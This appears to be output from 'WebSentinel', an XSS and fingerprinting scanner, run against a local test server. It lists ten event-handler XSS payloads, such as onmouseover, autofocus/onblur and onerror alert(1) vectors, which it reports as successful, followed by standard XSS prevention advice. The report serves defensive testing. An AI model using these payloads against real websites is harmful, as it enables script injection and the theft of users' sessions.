@@ -1,0 +1,83 @@
+ 
+* - * - @ ^ * - * - * - * - @ ^ * - # _ @ ^ @ ^ * - # _ @ ^ * # _ # @ ^ 
+# _ @ ^ # _ # _ # _ @ ^ # _ # _ @ ^ # _ # _ # _ # _ @ ^ # _ # ^ @ ^ # _ 
+^ # _ # _ @ ^ @ ^ # _ @ ^ # _ @ ^ @ ^ # _ @ ^ @ ^ @ ^ @ ^ @ ^ * - * @ ^ 
+* - *   __        __   _    ____             _   _            _   ^ # _
+# _ #	\ \      / /__| |__/ ___|  ___ _ __ | |_(_)_ __   ___| |  @ ^ *
+^ @ ^ 	 \ \ /\ / / _ \ '_ \___ \ / _ \ '_ \| __| | '_ \ / _ \ |  * - #
+* - *  	  \ V  V /  __/ |_) |__) |  __/ | | | |_| | | | |  __/ |  @ ^ *
+# _ #  	   \_/\_/ \___|_.__/____/ \___|_| |_|\__|_|_| |_|\___|_|  # @ ^
+^ @ ^                                                             # @ ^
+* - * - @ ^ * - * - * - * - @ ^ * - # _ @ ^ @ ^ * - # _ @ ^ * # _ # @ ^ 
+# _ @ ^ # _ # _ # _ @ ^ # _ # _ @ ^ # _ # _ # _ # _ @ ^ # _ # ^ @ ^ # _ 
+^ # _ # _ @ ^ @ ^ # _ @ ^ # _ @ ^ @ ^ # _ @ ^ @ ^ @ ^ @ ^ @ ^ * - * @ ^ 
+
+
+          		WEBSENTINEL REPORT FOR http://127.0.0.1:8000/
+
+FINGERPRINTING INFORMATION : 
+
+Web Server : WSGIServer/0.2 CPython/3.11.4
+Powered By : N/A
+Technology Stack : []
+Web Frameworks : []
+
+XSS VULNERABILITY REPORT : URL : http://127.0.0.1:8000/ - Depth: 0 
+XSS vulnerability detected with the instance : <tt onmouseover="alert(1)">test</tt>!
+
+XSS vulnerability detected with the instance : <a onblur=alert(1) tabindex=1 id=x></a><input autofocus>!
+
+XSS vulnerability detected with the instance : <col draggable="true" ondragenter="alert(1)">test</col>!
+
+XSS vulnerability detected with the instance : <caption onpointerdown=alert(1)>XSS</caption>!
+
+XSS vulnerability detected with the instance : <caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>!
+
+XSS vulnerability detected with the instance : <style onmouseleave="alert(1)">test</style>!
+
+XSS vulnerability detected with the instance : <svg><meta onload=alert(1)></meta>!
+
+XSS vulnerability detected with the instance : <figcaption onpointerleave=alert(1)>XSS</figcaption>!
+
+XSS vulnerability detected with the instance : <datalist id=x tabindex=1 onfocusin=alert(1)></datalist>!
+
+XSS vulnerability detected with the instance : <input type=image src=1 onerror=alert(1)>!
+
+The website follows poor input validation!!
+10 instances out of 10 were found to be malicious! 
+------------------------------------------------------------
+URL : http://127.0.0.1:8000/page3.html - Depth: 1 
+This webpage seems to be less or not vulnerable to XSS :) 
+
+0 instances out of 7373 were found to be malicious! 
+------------------------------------------------------------
+
+
+
+Cross-Site Scripting (XSS) is a type of security vulnerability that occurs when an attacker injects malicious scripts into a web application, which then gets executed by unsuspecting users. To prevent XSS attacks, you can follow these best practices:
+
+
+1. **Validate Inputs:** Check and clean all user inputs on the server side to ensure they're safe.
+
+2. **Encode Outputs:** Before displaying data, encode it to prevent injected scripts from executing.
+
+3. **Content Security Policy (CSP):** Set rules for allowed script sources to limit potential attack vectors.
+
+4. **HTTP-Only Cookies:** Keep sensitive data in cookies secure from JavaScript access.
+
+5. **Sanitize Rich Content:** Filter or use safe formats for user-generated content.
+
+6. **Escape JavaScript Data:** Ensure user inputs are properly escaped in dynamically generated JavaScript.
+
+7. **Stay Updated:** Keep software, frameworks, and plugins patched and current.
+
+8. **Train Developers:** Teach secure coding practices and conduct code reviews.
+
+9. **Use Security Headers:** Employ HTTP security headers to enhance protection.
+
+10. **Regular Audits:** Perform security checks and tests to catch and fix vulnerabilities.
+
+For more information visit https://portswigger.net/web-security/cross-site-scripting 
+
+
+REPORT GENERATED USING WEBSENTINAL PROJECT CODE : https://github.com/Madhvesh77/Web-application-fingerprinting-and-XSS-scanner
